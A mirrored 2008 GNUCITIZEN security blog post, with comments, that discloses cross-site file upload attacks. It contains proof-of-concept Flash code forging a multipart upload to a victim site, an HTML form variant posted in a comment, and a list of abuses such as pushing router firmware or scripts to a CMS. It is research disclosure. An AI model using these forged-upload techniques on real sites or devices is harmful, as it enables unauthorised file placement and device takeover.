@@ -1,0 +1,384 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/cross-site-file-upload-attacks/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:51:06 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; Cross-site File Upload Attacks</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; Cross-site File Upload Attacks Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='WiFi Infestations &#8211; Viral Wardriving' href='../wifi-infestations-viral-wardriving/index.html' />
+<link rel='next' title='Extreme Search Engine Hacking' href='../extreme-search-engine-hacking/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../indexdd7c.html?p=736' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-736" class="post">
+	<div class="post-title"><h2><span>Cross-site File Upload Attacks</span></h2></div>
+	<div class="post-date"><span>published:</span> February 21st, 2008</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p>As you probably already know, CSRF attack are only possible when the attacked web application does not have an additional mechanism to ensure that requests towards it are genuine. In order to do that, the web developer must include a unique token for each request, which is validated on the server upon receiving a request. If the request value that represents the token matches the token that was generated for the request, then it is considered genuine and it should be left for additional processing. However, if both values do not match then the request is considered forged and as such should be disregarded.</p>
+
+<p>Unfortunately, when it comes to file upload facilities, developers often forget to make such checks relying on the fact that file uploads are not spoofable, which in general is the correct assumption. However, when dealing with Web technologies, we often stumble across nasty surprises. The reason CSRF attacks against file uploads are not possible is because the HTML FORM specifications are not versatile enough to define sub-fields like <code>filename="whatever.txt"</code>, which are vital parts of the <code>multipart/form-data</code> specifications when submitting files. This is the only restriction and I will show you that attackers can easily overcome it with a bit of help from Flash.</p>
+
+<h3>Cross-site File Uploads</h3>
+
+<p>We&#8217;ve already proved that various forms of home routers can be <a href="../hacking-the-interwebs/index.html">entirely compromised</a> and hacked by <a href="../flash-upnp-attack-faq/index.html">forging UPnP requests with flash</a>. Now I will show you that file uploading facilities can be attacked in a similar way. Let&#8217;s examine the following code, which you can compile with Flex2 SDK &#8211; <code>c:\Flex2\bin\mxmlc code.mxml</code>:</p>
+
+<pre><code>&lt;mx:Application xmlns:mx="http://www.adobe.com/2006/mxml" creationComplete="onAppInit()"&gt;
+	&lt;mx:Script&gt;
+		/* by Petko D. Petkov; pdp
+		 * GNUCITIZEN
+		 **/
+		import flash.net.*;
+
+		private function onAppInit():void
+		{
+			var r:URLRequest = new URLRequest('http://victim.com/upload.php');
+
+			r.method = 'POST';
+			r.data = unescape('-----------------------------109092118919201%0D%0AContent-Disposition%3A form-data%3B name%3D%22file%22%3B filename%3D%22gc.txt%22%0D%0AContent-Type%3A text%2Fplain%0D%0A%0D%0AHi from GNUCITIZEN%21%0D%0A-----------------------------109092118919201%0D%0AContent-Disposition%3A form-data%3B name%3D%22submit%22%0D%0A%0D%0ASubmit Query%0D%0A-----------------------------109092118919201--%0A');
+			r.contentType = 'multipart/form-data; boundary=---------------------------109092118919201';
+
+			navigateToURL(r, '_self');
+		}
+	&lt;/mx:Script&gt;
+&lt;/mx:Application&gt;</code></pre>
+
+<p>If you carefully read the content of the script you will notice that we are preparing an <code>URLRequest</code> object which we load with a <code>POST</code> method, a <code>contentType</code> which equals to <code>multipart/form-data</code> and a url-encoded data text. If we unencode the text we get the following result. Now let&#8217;s have a look at it as well. Notice the <code>filename="gc.txt"</code> field:</p>
+
+<pre><code>&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;109092118919201
+Content&#45;Disposition: form&#45;data; name="file"; <strong>filename="gc.txt"</strong>
+Content&#45;Type: text/plain
+
+Hi from GNUCITIZEN!
+&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;109092118919201
+Content&#45;Disposition: form&#45;data; name="submit"
+
+Submit Query
+&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;109092118919201&#45;&#45;
+
+</code></pre>
+
+<p>This looks like a valid <code>multipart/form-data</code> file upload, doesn&#8217;t it? If you compile and execute the code you will see that the file upload is completely valid and will upload a file called <code>gc.txt</code> with content of <code>Hi from GNUCITIZEN!</code>. But you can also use the following PHP script to verify the result if you feel skeptical about the whole concept.</p>
+
+<pre><code>&lt;?php if ($_FILES['file']['error'] &gt; 0): ?&gt;
+	&lt;h1&gt;Failiure&lt;/h1&gt;
+	&lt;pre&gt;
+		&lt;?php print_r($_FILES) ?&gt;
+	&lt;/pre&gt;
+&lt;?php elseif (isset($_FILES['file'])): ?&gt;
+	&lt;h1&gt;Success&lt;/h1&gt;
+	&lt;pre&gt;
+		&lt;?php print_r($_FILES) ?&gt;
+		&lt;?php echo file_get_contents($_FILES['file']['tmp_name']) ?&gt;
+	&lt;/pre&gt;
+&lt;?php else: ?&gt;
+	&lt;form method="post" enctype="multipart/form-data"&gt;
+		&lt;input type="file" name="file"/&gt; 
+		&lt;input type="submit" name="submit"/&gt;
+	&lt;/form&gt;
+&lt;?php endif ?&gt;</code></pre>
+
+<h3>The Impact of Cross-site File Upload (CSFU) Attacks</h3>
+
+<p>Like CSRF attacks, there are plenty of things one can do with this type of technique. Here is a couple of evil things that come into my mind:</p>
+
+<ul>
+<li>Upload a nasty picture on someone&#8217;s profile &#8211; I admit this is not very useful but still very funny and open for abuse.</li>
+<li>Upload a shiny new firmware to the router that is under attack by using the user as a proxy. This is pretty nasty and given the fact that there are numerous authentication bypass and A-to-C bugs floating around, it is very, very feasible.</li>
+<li>Upload a shiny new configuration file on the router that is under attack. Same as the one above &#8211; very feasible and easy to perform.</li>
+<li>Upload executable scripts on CMS &#8211; this of course is a bit more targeted..</li>
+</ul><div class="single-content-bottom-widgets"></div></div>
+		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pdp/index.html" title="Posts by pdp" rel="author">pdp</a></div>
+	<div class="post-tags">Tags: <a href="../../tags/cross-site-file-upload/index.html" rel="tag">Cross-site File Upload</a> | <a href="../../tags/cross-site-scripting/index.html" rel="tag">cross-site scripting</a> | <a href="../../tags/csfu/index.html" rel="tag">CSFU</a> | <a href="../../tags/csrf/index.html" rel="tag">csrf</a> | <a href="../../tags/embedded-hacking/index.html" rel="tag">embedded hacking</a> | <a href="../../tags/file-upload/index.html" rel="tag">file upload</a> | <a href="../../tags/hack/index.html" rel="tag">hack</a> | <a href="../../tags/secure/index.html" rel="tag">secure</a> | <a href="../../tags/security/index.html" rel="tag">security</a></div></div>
+				
+
+				<div id="post-comments">
+					<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-115330">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115330">
+			February 21, 2008 at 1:46 pm</a>		</div>
+
+		<p><a href="../../about/mario.html" rel="nofollow">.mario</a> reported that <a href="http://kuza55.blogspot.com/" rel="nofollow">kuza55</a> has identified a similar problem which depends on a weird bug within Firefox, IE and Safari. Opera is not affected. Here is a demonstration of his code:</p>
+<pre><code>&lt;form method="post" action="http://kuza55.awardspace.com/files.php" enctype="multipart/form-data"&gt;
+&lt;textarea name='file"; filename="filename.ext
+Content-Type: text/plain; '&gt;Arbitrary File
+Contents&lt;/textarea&gt;
+&lt;input type="submit" value='Send "File"' /&gt;
+&lt;/form&gt;</code></pre>
+<p>hmmm, very, very, interesting.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-115381">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/2f6303f9095f59c14c3097ef4df566f5?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://kuza55.blogspot.com/' rel='external nofollow' class='url'>kuza55</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115381">
+			February 22, 2008 at 2:46 am</a>		</div>
+
+		<p>That&#8217;s interesting. I&#8217;ve only played with the AS2 LoadVars Class (Since I&#8217;ve been to lazy to setup Flex, etc), so I thought you couldn&#8217;t use Flash to do that since LoadVars URL encodes whatever you put in request body.</p>
+<p>Are there many differences between the LoadVars and URLRequest classes?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-115403">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115403">
+			February 22, 2008 at 8:44 am</a>		</div>
+
+		<p><code>LoadVars</code> is inferior when compared to <code>URLRequest</code> combined with <code>navigateToURL</code> or even better <code>sendToURL</code>. Simply put, the <code>navigateToURL</code> function will open the result into a browser window/tab while <code>sendToURL</code> will silently execute it in the background. No restrictions applied!</p>
+<p>btw, setting up flex environment is not very hard. you just need the FlexSDK .zip file. Decompress it somewhere on the disk. write your MXML or AS and compile with mxmlc like this:</p>
+<pre><code>path/to/flexsdk/<strong>bin/mxmlc path/to/app.mxml</strong></code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-115530">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/680d96ca25f385f5c7a8caa341413aca?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.google.com/' rel='external nofollow' class='url'>757362</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115530">
+			February 24, 2008 at 6:56 pm</a>		</div>
+
+		<p>Interesting project. </p>
+<p>&#8220;Like CSRF attacks, there are plenty of things one can do with this type of technique.&#8221;</p>
+<p>- DOM XSS attack entry point.</p>
+<p>Using haXe with the Flex2 Framework<br />
+<a href="http://haxe.org/manual/3/interop#using_haxe_with_the_flex2_framework" rel="nofollow">http://haxe.org/manual/3/inter....._framework</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-115719">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/8ae2c1a047f75c6ee65b77faf5433416?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">guesty</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115719">
+			February 27, 2008 at 11:57 am</a>		</div>
+
+		<p>and how about spoofing the refe(f)rer with flash?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-115720">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115720">
+			February 27, 2008 at 12:16 pm</a>		</div>
+
+		<p>it used to work but not sure what is the situation right now.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-115824">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/bd8ac47a2a650bc3add0502686f33e39?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Matt Presson</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115824">
+			March 3, 2008 at 11:54 pm</a>		</div>
+
+		<p>Just a thought here, but after doing some simple research on Flash and file access, an attacker could use &#8220;one of the wrapper programs that have been written to allow local file access (SWF Studio, Zinc, Screenweaver, etc)&#8221; (per <a href="http://www.flash-creations.com/notes/servercomm_textfile.php" rel="nofollow">http://www.flash-creations.com.....xtfile.php</a>) along with the above code to create a drive-by file upload service. Especially if you used sendToURL().</p>
+<p>If I understand what is presented on the above referenced page, and I may not, then if you could get anyone to visit your page you could upload any file you wished to your server from their local machine.</p>
+<p>Any thoughts? Am I crazy?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-116061">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/69a18d4cf1cabaaf6f938d3a9b6f2693?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://tahshurshooa.googlepages.com/' rel='external nofollow' class='url'>Danno</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-116061">
+			March 8, 2008 at 11:07 am</a>		</div>
+
+		<p>Routers and modems bypassed, now cross site file upload attacks. Good thing I stopped playing poker online for cash. I don&#8217;t use this thing to bank or trade stock on either. Cheeky, aren&#8217;t they.</p>
+<p>What is a n00b to do?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-124853">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/dab9f1412262426064cb5e6e990d5d50?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">maosud</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-124853">
+			December 23, 2008 at 11:45 am</a>		</div>
+
+		<p>i want to upload file with a large size</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-124856">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.pdp.io/' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-124856">
+			December 23, 2008 at 3:36 pm</a>		</div>
+
+		<p>this method should work although it could also fail from time to time.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-126113">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/a26ab14b9f92021db6fa10be81546e29?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://appfuzzer.com/' rel='external nofollow' class='url'>blake</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126113">
+			February 24, 2009 at 11:03 pm</a>		</div>
+
+		<p>it works great for webmail (yahoo/symantec &amp; gmail).</p>
+<p>see screenshots of yahoo and gmail in .ppt presentation back in July ‘08 on <a href="http://www.appfuzzer.com/" rel="nofollow">http://www.appfuzzer.com</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-127435">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/26d30779c4080f21f4c3709e015ebd2e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.cikis.net/' rel='external nofollow' class='url'>site ekle</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-127435">
+			June 9, 2009 at 9:29 am</a>		</div>
+
+		<p>Thank you for article. I took great pleasure to read</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-127638">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/aef3706bbe7b75c1cd8de34fbd7d06a9?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.sonsayfam.com/' rel='external nofollow' class='url'>Sohbet</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-127638">
+			July 22, 2009 at 5:52 am</a>		</div>
+
+		<p>Thank you for article. I took great pleasure to read (:</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="736"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="7101501adc" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/cross-site-file-upload-attacks/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:51:19 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
